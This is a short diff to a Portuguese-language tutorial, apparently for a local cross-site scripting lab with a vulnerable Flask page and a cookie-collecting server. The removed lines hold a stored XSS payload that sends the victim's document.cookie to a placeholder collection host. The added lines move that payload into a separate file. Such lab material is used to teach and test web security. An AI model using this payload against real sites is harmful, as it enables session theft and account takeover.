@@ -79,12 +79,8 @@ Inicie o servidor de coleta de cookies: Coloque o arquivo coletar_cookie.php em 
 
 Acesse a página vulnerável em http://127.0.0.1:5000.
 
-Crie a carga maliciosa: No campo de comentário, insira o seguinte script. Substitua http://seu-servidor-de-coleta.com pela URL do seu servidor Flask.
-
-HTML
-<script>
-    document.write('<img src="http://seu-servidor-de-coleta.com/coletar_cookie.php?cookie=' + document.cookie + '">');
-</script>
+Crie a carga maliciosa: No campo de comentário, insira o seguinte script ataca.html.
+Substitua http://seu-servidor-de-coleta.com pela URL do seu servidor Flask.
 
 Envie o comentário: Clique em "Enviar". A página irá recarregar e exibir a mensagem de sucesso.
 
